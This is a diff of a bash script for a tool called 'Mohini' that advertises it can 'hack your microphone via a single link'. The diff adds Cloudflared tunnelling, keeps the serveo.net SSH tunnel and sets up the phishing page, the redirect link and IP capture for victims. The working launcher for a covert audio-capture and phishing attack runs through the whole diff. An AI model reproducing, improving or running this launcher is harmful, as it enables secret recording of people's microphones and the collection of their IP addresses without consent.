@@ -1,10 +1,14 @@
 #!/bin/bash
-# Mohini v1.1
+# Mohini v1.3
 # coded by: github.com/LxaNce-Hacker/Mohini
 # Using Recorderjs by: https://github.com/mattdiamond/Recorderjs
 
 
-__version__="1.2"
+__version__="1.3"
+
+## DEFAULT HOST & PORT
+HOST='127.0.0.1'
+PORT='3333'
 
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
@@ -35,7 +39,7 @@ banner() {
     echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⢀⣠⣾⢱⣿⣿⣿⢸⣿⣿⣿⠁⢀⣠⠤⠤⣿⣿⡘⣿⣇⠀⠀⠀⠀⠀⠀
     echo -e ${GREEN}⠀⠀⠀⠀⠀⠈⠉⠉⣡⣿⣿⣿⠇⣾⣿⣿⠇⠀⢀⣴⣶⣶⠊⢿⣧⢻⣿⡄⠀⠀⠀⠀⠀       ${RED}Hi 👋,
     echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⢠⣾⣿⡿⠟⣡⣾⣿⣿⡟⠀⠀⠀⠉⠉⠀⠀⣀⡻⣷⡹⣿⣦⣤⠀⠀⠀       ${RED}I am Mohini,
-    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⢸⡏⣴⠿⠿⡿⠿⢟⣫⡏⠐⠶⠆⠀⠀⠀⣸⣿⢹⣝⢿⣶⡀⠀⠀⠀⠀       ${RED}I can hack your microphone via a single link...
+    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⢸⡏⣴⠿⠿⡿⠿⢟⣫⡏⠐⠶⠆⠀⠀⠀⣸⣿⢹⣝⢿⣶.⠀⠀⠀⠀       ${RED}I can hack your microphone via a single link...
     echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⣸⢻⡏⣾⣿⣿⣿⢿⡋⠀⢉⣉⡝⠀⠀⣰⣿⣿⡏⣿⣷⠻⣷⣄⠀⠀⠀
     echo -e ${GREEN}⠀⠀⠀⠀⠀⠠⠤⠞⣡⣿⣿⣿⢟⠸⣿⣦⣀⠀⢀⣠⡞⢻⣿⣿⣷⠘⢿⡄⠀⠉⠛⠒⠂       ${RED}Current Version : ${CYAN}${__version__}
     echo -e ${GREEN}⠀⠀⠀⠀⠀⢀⣠⣾⠿⢟⣫⡶⢫⠀⣿⡿⢿⣿⡿⠋⢠⣾⣿⣿⣿⡟⣮⠻⢤⣀⠀⠀⠀       ${RED}Supported : ${CYAN}Linux, Termux
@@ -59,6 +63,7 @@ stop() {
   checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
   checkphp=$(ps aux | grep -o "php" | head -n1)
   checkssh=$(ps aux | grep -o "ssh" | head -n1)
+  checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)
 
   if [[ $checkngrok == *'ngrok'* ]]; then
     pkill -f -2 ngrok > /dev/null 2>&1
@@ -73,12 +78,107 @@ stop() {
     killall -2 ssh > /dev/null 2>&1
   fi
 
+  if [[ $checkcloudflared == *'cloudflared'* ]]; then
+    pkill -f -2 cloudflared > /dev/null 2>&1
+    killall -2 cloudflared > /dev/null 2>&1
+  fi
+
   exit 1
 }
 
 dependencies() {
   command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 }
+
+## Download
+download() {
+	curl --progress-bar --create-dirs -L "$1" -o ".server/$2"
+}
+
+## Start PHP server
+start_php() {
+	echo -e "${RED}[${WHITE}-${RED}]${GREEN} Starting php server...(localhost:$PORT)"
+	fuser -k $PORT/tcp > /dev/null 2>&1
+	php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
+	sleep 2
+}
+
+## Choose custom port
+cusport() {
+	echo
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}Y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
+		echo -e "\n"
+		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
+		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
+			PORT=${CU_P}
+			echo
+		else
+			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
+			{ sleep 2; clear; banner; cusport; }
+		fi
+	else
+		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
+	fi
+}
+
+install_cloudflared() {
+	if [[ -e ".server/cloudflared" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
+		else
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
+		fi
+	fi
+}
+
+start_cloudflared() {
+	mkdir -p .server
+	rm .server/.cld.log > /dev/null 2>&1
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	start_php
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+
+	# Check if Cloudflared is installed
+	if command -v cloudflared > /dev/null 2>&1; then
+		# If installed, use the system Cloudflared
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Cloudflared package detected. Using system Cloudflared..."
+		cloudflared tunnel -url "http://$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	elif [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "http://$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	else
+		sleep 2 && ./.server/cloudflared tunnel -url "http://$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	fi
+
+	echo -e "\n\n${RED}[${WHITE}*${RED}]${GREEN} Waiting for Cloudflared link..."
+	while true; do
+		if [[ -e ".server/.cld.log" ]]; then
+			cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log" | head -n1)
+			if [[ -n "$cldflr_url" ]]; then
+				break
+			fi
+		fi
+		sleep 1
+	done
+	echo "$cldflr_url" > sendlink
+	custom_url "$cldflr_url"
+}
+
+custom_url() {
+	echo -e "${RED}[${WHITE}+${RED}]${GREEN} Direct link : ${BLUE}$1"
+	payload
+	checkfound
+}
+
 
 catch_ip() {
   ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
@@ -111,7 +211,7 @@ checkfound() {
 
 # Check for a newer release
 check_update(){
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
+	echo -ne "${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
 	relase_url='https://api.github.com/repos/LxaNce-Hacker/Mohini/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
 	tarball_url="https://github.com/LxaNce-Hacker/Mohini/archive/refs/tags/${new_version}.tar.gz"
@@ -136,12 +236,13 @@ check_update(){
 			{ reset_color; exit 1; }
 		fi
 	else
-		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
+		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep 1 ; clear
 	fi
 }
 
 ## Check Internet Status
 check_status() {
+    banner;
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
 	if [ $? -ne 0 ]; then
@@ -168,19 +269,17 @@ server() {
   fi
 
   if [[ $subdomain_resp == true ]]; then
-    $(which sh) -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $subdomain:80:localhost:3333 serveo.net > sendlink 2>&1" &
+    $(which sh) -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $subdomain:80:localhost:$PORT serveo.net > sendlink 2>&1" &
     sleep 8
   else
-    $(which sh) -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > sendlink 2>&1" &
+    $(which sh) -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$PORT serveo.net > sendlink 2>&1" &
     sleep 8
   fi
 
-  echo -e "${RED}[${WHITE}-${RED}]${GREEN} Starting php server...(localhost:3333)"
-  fuser -k 3333/tcp > /dev/null 2>&1
-  php -S localhost:3333 > /dev/null 2>&1 &
+  start_php
   sleep 3
-  send_link=$(grep -o 'https://[^ ]*' sendlink)
-  echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Direct link : ${BLUE}$send_link"
+  send_link=$(grep -o 'https://[a-zA-Z0-9.-]*serveo[a-zA-Z0-9.-]*' sendlink | head -n1)
+  custom_url "$send_link"
 }
 
 start1() {
@@ -190,7 +289,8 @@ start1() {
 
   printf "\n"
   echo -e "\n${RED}[${WHITE}01${RED}]${GREEN} Serveo.net"
-  echo -e "${RED}[${WHITE}02${RED}]${GREEN} Comming Soon...\n"
+  echo -e "${RED}[${WHITE}02${RED}]${GREEN} Cloudflared"
+  echo -e "${RED}[${WHITE}03${RED}]${GREEN} Coming Soon...\n"
   default_option_server="1"
   read -p "${RED}[${WHITE}+${RED}]${ORANGE} Choose a port forwarding option :${BLUE} " option_server
   option_server="${option_server:-${default_option_server}}"
@@ -200,9 +300,12 @@ start1() {
   redirect_link="${redirect_link:-${default_redirect}}"
 
   if [[ $option_server -eq 1 ]]; then
-    command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+    command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
     start
   elif [[ $option_server -eq 2 ]]; then
+    install_cloudflared
+    start_cloudflared
+  elif [[ $option_server -eq 3 ]]; then
     comming_soon
   else
     echo -e "\n${RED}[${WHITE}!${RED}]${GREEN} Invalid option!"
@@ -213,9 +316,8 @@ start1() {
 }
 
 payload() {
-  send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-  sed 's+forwarding_link+'$send_link'+g' template.php > index.php
-  sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
+  cp template.php index.php
+  sed "s+redirect_link+$redirect_link+g" js/_app.js > js/app.js
 }
 
 comming_soon() {
@@ -236,8 +338,6 @@ start() {
   fi
 
   server
-  payload
-  checkfound
 }
 
 check_status
